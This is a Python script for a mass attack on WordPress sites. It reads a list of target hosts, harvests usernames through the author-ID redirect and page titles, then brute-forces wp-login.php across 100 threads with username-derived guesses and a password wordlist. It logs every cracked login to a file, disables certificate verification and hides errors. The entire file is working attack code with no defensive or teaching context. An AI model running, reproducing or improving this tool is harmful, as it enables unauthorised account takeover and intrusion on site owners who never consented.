#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import requests
from socket import *
import time
from random import randrange
from queue import Queue
# from multiprocessing import Queue
from threading import Thread
from requests.exceptions import HTTPError
from hashlib import md5
import logging
from OpenSSL import crypto
from requests import pyopenssl as reqs
import re
from bs4 import BeautifulSoup
import urllib3

loguser = "./users.txt"
usl = logging.FileHandler(loguser)
ulogger = logging.getLogger('log')
ulogger.setLevel(logging.INFO)
ulogger.addHandler(usl)

THREADS_COUNT = 100

def get_user_agent():
    user_agent = {
        'User-agent': '"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Safari/605.1.15'}
    return user_agent


def main():
    setdefaulttimeout(15)
    q = Queue(maxsize=0)
    with open("./res.txt") as ip:
        target = [line.rstrip('\n') for line in ip]

        for i in range(len(target)):
            for id in range(10):
                q.put_nowait((i, target[i], id))

    start_thread(q)


def start_thread(q):
    for i in range(THREADS_COUNT):
        worker = Thread(target=processor, args=(q,))
        worker.setDaemon(True)
        worker.start()
    q.join()


def processor(q, ):
    while not q.empty():
        item = q.get_nowait()
        ex_user_name(q, item[1], item[2])
        q.task_done()
    return True


def start_bruteforce(b):
    for i in range(THREADS_COUNT):
        worker = Thread(target=brute_process, args=(b,))
        worker.setDaemon(True)
        worker.start()
    b.join()


def brute_process(b, ):
    while not b.empty():
        item = b.get_nowait()
        ex_bruteforce(b, item[1], item[2], item[3])
        b.task_done()
    return True


def ex_bruteforce(q, session_url, username, password):

    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    payload = "log={}&pwd={}&wp-submit=%E7%99%BB%E5%BD%95&redirect_to=http%3A%2F%2F{}%2Fwp-admin%2F&testcookie=1".format(
        username, password, session_url)

    # print ("host: {} user: {} password: {}".format(session_url,username,password))

    try:
        session = requests.Session()
        session.headers.update(get_user_agent())

        r = session.get(session_url + "/wp-login.php", allow_redirects=True, data=payload, headers=headers, verify=False, timeout=15)

        if r.status_code == 200:
            response = session.post(session_url + "/wp-login.php", allow_redirects=True, data=payload, headers=headers, verify=False, timeout=15)

            if 'wp-admin' in response.url:
                ulogger.info("host: {} user: {} password: {}".format(session_url, username, password))
                print("\t[+] {} user={} password={}".format(session_url, username, password))

    except:
        pass


def ex_user_name(q, session_url, id):
    b = Queue(maxsize=0)

    try:
        response = requests.get(session_url + "/index.php?author={}".format(id), allow_redirects=True,
                                timeout=15, verify=False)

        if response.status_code == 200:
            if '/author/' in response.url:
                end = response.url.rfind('author/')
                user = response.url[end + 7:len(response.url)]

                user = user.replace('/', '')

                if user != '':
                    ulogger.info("{}|{}".format(session_url, user))

                    with open("./user_ext.txt") as n_ext:
                        ext = [line.rstrip('\n') for line in n_ext]
                        for i in range(len(ext)):
                            password ="{}{}".format(user, ext[i])
                            b.put_nowait((i, session_url, user, password))


                    with open("./best.txt") as ip:
                        target = [line.rstrip('\n') for line in ip]

                        for i in range(len(target)):
                            b.put_nowait((i, session_url, user, target[i]))

            if b"author" in response.content:
                soup = BeautifulSoup(response.content, 'lxml')
                title = soup.title.string
                end = title.find('|')

                if end == -1:
                    end = title.find(' ')

                if end == -1:
                    end = title.find(',')

                if end == -1:
                    end = title.find('-')

                username = title[0:end]

                if username.isascii() and username != "404" and username != '' and username != user:
                    ulogger.info("{}|{}".format(session_url, username))

                    with open("./user_ext.txt") as n_ext:
                        ext = [line.rstrip('\n') for line in n_ext]
                        for i in range(len(ext)):
                            password ="{}{}".format(username,ext[i])
                            b.put_nowait((i, session_url, username, password))

                    with open("./best.txt") as ip:
                        target = [line.rstrip('\n') for line in ip]

                        for i in range(len(target)):
                            b.put_nowait((i, session_url, username, target[i]))

        if user == '' and username == '':
            with open("./best.txt") as ip:
                target = [line.rstrip('\n') for line in ip]

                for i in range(len(target)):
                    b.put_nowait((i, session_url, 'admin', target[i]))

        start_bruteforce(b)

    except:
        pass


if __name__ == '__main__':
    urllib3.disable_warnings()
    sys.exit(main())
